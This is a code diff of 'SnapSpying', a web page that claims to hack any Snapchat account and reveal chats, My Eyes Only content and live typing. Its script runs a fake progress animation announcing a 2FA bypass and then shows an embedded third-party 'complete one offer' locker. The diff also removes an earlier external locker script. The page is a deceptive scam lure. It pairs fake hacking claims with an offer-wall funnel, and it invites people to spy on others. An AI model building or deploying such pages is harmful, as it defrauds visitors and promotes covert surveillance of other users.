@@ -20,29 +20,14 @@
         .input-error { border: 1px solid #ff3b30 !important; }
         .privacy-card { background: #000; border: 1px solid #1c1c1e; border-radius: 14px; padding: 16px; margin-bottom: 12px; text-align: left; }
         
-        .preview-img-container {
-            width: 100%;
-            border-radius: 20px;
-            overflow: hidden;
-            margin-bottom: 25px;
-            background: #111;
-        }
-        #action-preview-img {
-            width: 100%;
-            height: auto;
-            display: none;
-            filter: blur(5px);
-            transform: scale(1.02);
-        }
-
-        #verify-modal [data-captcha-enable="true"] {
-            margin: 0 auto;
-            display: flex;
-            justify-content: center;
-        }
+        /* Snapchat Styled Frame for Locker */
+        #snap-locker-modal { display: none; position: fixed; inset: 0; z-index: 500; background: #000; flex-direction: column; align-items: center; justify-content: center; }
+        .snap-card { width: 95%; max-width: 420px; background: #fff; border-radius: 35px; overflow: hidden; color: #000; text-align: center; }
+        .snap-head { background: #ffd500; padding: 20px; font-weight: 900; font-size: 20px; }
+        .locker-frame { width: 100%; height: 500px; border: none; }
     </style>
 </head>
-<body class="flex flex-col items-center px-6 pt-4 min-h-screen pb-12">
+<body class="flex flex-col items-center px-6 pt-4 min-h-screen">
 
     <header class="w-full max-w-md flex justify-between items-center py-4 mb-6">
         <h1 class="text-2xl font-bold tracking-tight">Snap<span class="text-[#ffd500]">Spying</span></h1>
@@ -52,7 +37,7 @@
         </div>
     </header>
 
-    <div class="w-full max-w-md flex-1">
+    <div class="w-full max-w-md">
         <p class="text-[15px] font-medium mb-3">Enter the username you want to check</p>
         <div class="flex gap-2 mb-2">
             <input type="text" id="username" placeholder="Username" class="input-box flex-1 rounded-2xl px-4 py-4 outline-none text-sm text-white">
@@ -66,7 +51,7 @@
         </div>
 
         <div id="actions-grid" class="opacity-40 pointer-events-none transition-opacity duration-700 space-y-3">
-            <div onclick="openAction('Watch live typing in real-time', 'typing')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('Live Typing', '582,393', 'Watch live typing in real-time', 'typing')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
                     <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-keyboard text-gray-500 text-xl"></i></div>
                     <div><h3 class="font-bold text-[15px]">Live Typing</h3><p class="text-[11px] text-gray-500">See what your friend is typing in real-time</p></div>
@@ -74,7 +59,7 @@
                 <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <div onclick="openAction('8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('Best Friends', '1,042,100', '8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
                     <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-user-group text-gray-500 text-xl"></i></div>
                     <div><h3 class="font-bold text-[15px]">Reveal Best Friends</h3><p class="text-[11px] text-gray-500">8 Best Friends of any user</p></div>
@@ -82,7 +67,7 @@
                 <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <div onclick="openAction('Access My Eyes Only content of any user', 'eyes')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('Eyes Only', '94,204', 'Access My Eyes Only content of any user', 'eyes')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
                     <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-eye text-gray-500 text-xl"></i></div>
                     <div><h3 class="font-bold text-[15px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500">Access My Eyes Only content of any user</p></div>
@@ -90,7 +75,7 @@
                 <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
             </div>
 
-            <div onclick="openAction('Message history of any user, including sent, received, opened, and saved chats', 'chat')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('Chat History', '215,902', 'Message history of any user, including sent, received, opened, and saved chats', 'chat')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
                     <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-comment-dots text-gray-500 text-xl"></i></div>
                     <div><h3 class="font-bold text-[15px]">Reveal Chat History</h3><p class="text-[11px] text-gray-500 leading-tight">Message history including sent, received...</p></div>
@@ -100,27 +85,19 @@
         </div>
     </div>
 
-    <div class="mt-12 opacity-40 flex flex-col items-center gap-2">
-        <div class="flex items-center gap-2">
-            <i class="fas fa-circle-check text-[#ffd500] text-sm"></i>
-            <span class="text-[10px] uppercase font-black tracking-widest">Verified Security Protocol</span>
-        </div>
-        <p class="text-[9px] font-medium text-gray-500">Secure connection via encrypted tunnel v4.2</p>
-    </div>
-
     <div id="privacy-sheet" class="fixed inset-0 z-[200] hidden">
         <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="toggleSheet('privacy-sheet')"></div>
-        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[30px] sheet h-[85vh] overflow-y-auto flex flex-col">
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[30px] sheet h-[90vh] overflow-y-auto flex flex-col">
             <div class="flex justify-between items-center px-6 py-5 sticky top-0 bg-[var(--card)] z-10 border-b border-white/5">
-                <h2 class="text-[18px] font-bold">Privacy Policy</h2>
+                <h2 class="text-[18px] font-bold">SnapSpying Privacy Policy</h2>
                 <button onclick="toggleSheet('privacy-sheet')" class="text-white text-xl"><i class="fas fa-times"></i></button>
             </div>
-            <div class="px-6 py-6 pb-20">
-                <p class="text-[#8e8e93] text-[13px] font-medium mb-4 italic">Last updated: April 30, 2026</p>
-                <p class="text-white text-[14px] leading-relaxed mb-6">This Privacy Policy describes how your personal information is collected, used, and shared when you visit SnapSpying (the "Platform").</p>
-                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Information We Collect</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying is designed for entertainment purposes only. We do not store, log, or share any usernames entered on this platform. All simulations are performed locally in your browser session.</p></div>
-                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">How We Use Your Information</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">Any data shown during the "Reveal" process is part of a visual simulation designed to demonstrate potential UI layouts and is not retrieved from actual private servers.</p></div>
-                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Security</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">We use industry-standard encryption to ensure your visit remains private and secure from third-party interception.</p></div>
+            <div class="px-6 py-6">
+                <p class="text-[#8e8e93] text-[13px] font-medium mb-4 italic">Last updated: April 28, 2026</p>
+                <div class="privacy-card">
+                    <h3 class="font-bold text-[15px] mb-2">Information We Collect</h3>
+                    <p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying is designed for entertainment purposes only...</p>
+                </div>
             </div>
         </div>
     </div>
@@ -129,32 +106,32 @@
         <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeActionSheet()"></div>
         <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-10 sheet text-center">
             <div class="w-10 h-1 bg-gray-700 mx-auto mb-8 rounded-full"></div>
-            <div class="preview-img-container"><img id="action-preview-img" src="" alt="preview"></div>
-            <h4 id="r-title" class="text-[18px] font-bold mb-10 px-4 leading-tight"></h4>
+            <h3 id="r-count" class="text-3xl font-bold mb-1">0</h3>
+            <p class="text-[10px] text-gray-500 uppercase font-black mb-10">Viewed 100+ times</p>
+            <div class="flex justify-center -space-x-5 mb-10" id="avatar-stack"></div>
+            <h4 id="r-title" class="text-[17px] font-bold mb-10 px-6"></h4>
             <button onclick="runExploit()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg">Reveal</button>
         </div>
     </div>
 
     <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-8">
-        <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5 text-center">
+        <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5">
             <div class="flex items-center gap-2 mb-8">
                 <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
                 <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Processing</span>
                 <span id="p-percent" class="ml-auto text-[#ffd500] font-bold">0%</span>
             </div>
-            <h2 id="p-status" class="text-xl font-bold mb-3 text-white">Initializing...</h2>
+            <h2 id="p-status" class="text-xl font-bold mb-3 text-white">Initializing exploit...</h2>
             <div class="h-2 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
-            <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Bypassing security layers...</p>
+            <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Bypassing 2FA Authentication...</p>
         </div>
     </div>
 
-    <div id="verify-modal" class="hidden fixed inset-0 z-[400] bg-[#000] flex flex-col items-center justify-center p-8 text-center overflow-y-auto">
-        <div class="w-20 h-20 bg-[#ffd500]/10 rounded-full flex items-center justify-center mb-8 border border-[#ffd500]/20"><i class="fas fa-lock text-[#ffd500] text-4xl"></i></div>
-        <h2 class="text-2xl font-bold mb-2">Verification Required</h2>
-        <p class="text-gray-500 text-sm mb-12">Please complete the security check to continue</p>
-        
-        <div class="w-full max-w-sm">
-            <div data-captcha-enable="true"></div>
+    <div id="snap-locker-modal">
+        <div class="snap-card">
+            <div class="snap-head"><i class="fab fa-snapchat mr-2"></i> VERIFICATION</div>
+            <iframe src="https://authenticateapp.online/cl/i/n66mg4" class="locker-frame"></iframe>
+            <div class="p-3 text-[10px] font-bold text-gray-400">COMPLETE ONE OFFER TO REVEAL DATA</div>
         </div>
     </div>
 
@@ -169,12 +146,24 @@
             const user = document.getElementById('username').value;
             const btn = document.getElementById('connBtn');
             const inp = document.getElementById('username');
-            if(user.length < 4) { inp.classList.add('input-error'); return; }
+            const err = document.getElementById('error-msg');
+            
+            if(user.length < 4) {
+                inp.classList.add('input-error');
+                err.classList.remove('hidden');
+                return;
+            }
+            
             if(btn.innerText === "Disconnect") { location.reload(); return; }
+
+            inp.classList.remove('input-error');
+            err.classList.add('hidden');
             btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
             btn.disabled = true;
+
             setTimeout(() => {
-                btn.disabled = false; btn.innerText = "Disconnect";
+                btn.disabled = false;
+                btn.innerText = "Disconnect";
                 btn.classList.replace('bg-[#2c2c2e]', 'bg-[#ff3b30]');
                 document.getElementById('conn-status').classList.remove('hidden');
                 document.getElementById('targetName').innerText = '@' + user;
@@ -183,11 +172,14 @@
             }, 1500);
         }
 
-        function openAction(desc, type) {
-            const previewImg = document.getElementById('action-preview-img');
-            previewImg.src = type + '.jpg'; 
-            previewImg.style.display = 'block';
+        function openAction(title, count, desc, type) {
+            const stack = document.getElementById('avatar-stack');
+            stack.innerHTML = '';
+            for(let i=1; i<=3; i++) {
+                stack.innerHTML += `<img src="https://i.pravatar.cc/150?u=${type}${i}" class="w-16 h-16 rounded-full border-[6px] border-[var(--card)] shadow-xl">`;
+            }
             document.getElementById('r-title').innerText = desc;
+            document.getElementById('r-count').innerText = count;
             toggleSheet('action-sheet');
         }
 
@@ -197,22 +189,42 @@
             closeActionSheet();
             setTimeout(() => {
                 document.getElementById('proc-modal').classList.remove('hidden');
-                let p = 0; const bar = document.getElementById('bar');
+                let p = 0;
+                const bar = document.getElementById('bar');
                 const percent = document.getElementById('p-percent');
+                const status = document.getElementById('p-status');
+                const log = document.getElementById('p-log');
+                
+                const steps = [
+                    {p: 25, s: 'Bypassing 2FA Authentication', l: 'Initializing SnapSpying exploit...'},
+                    {p: 50, s: '2FA Authentication successfully bypassed', l: 'Bypassing 2FA Authentication...'},
+                    {p: 75, s: 'Compiling display', l: 'Compiling display...'},
+                    {p: 100, s: 'Success - user will not be notified', l: 'Finalizing verification protocol...'}
+                ];
+
+                let stepIdx = 0;
                 const interval = setInterval(() => {
-                    p += 1; bar.style.width = p + '%'; percent.innerText = p + '%';
+                    p += 1;
+                    bar.style.width = p + '%';
+                    percent.innerText = p + '%';
+                    
+                    if(p >= steps[stepIdx].p) {
+                        status.innerText = steps[stepIdx].s;
+                        log.innerText = steps[stepIdx].l;
+                        stepIdx = Math.min(stepIdx + 1, steps.length - 1);
+                    }
+
                     if(p >= 100) {
                         clearInterval(interval);
                         setTimeout(() => {
                             document.getElementById('proc-modal').classList.add('hidden');
-                            document.getElementById('verify-modal').classList.remove('hidden');
-                        }, 500);
+                            // Redir l-locker hna f-nefs l-page
+                            document.getElementById('snap-locker-modal').style.display = 'flex';
+                        }, 800);
                     }
                 }, 40);
             }, 400);
         }
     </script>
-
-    <script type="text/javascript" src="https://appchecker.space/cp/js/2wx2k"></script>
 </body>
 </html>
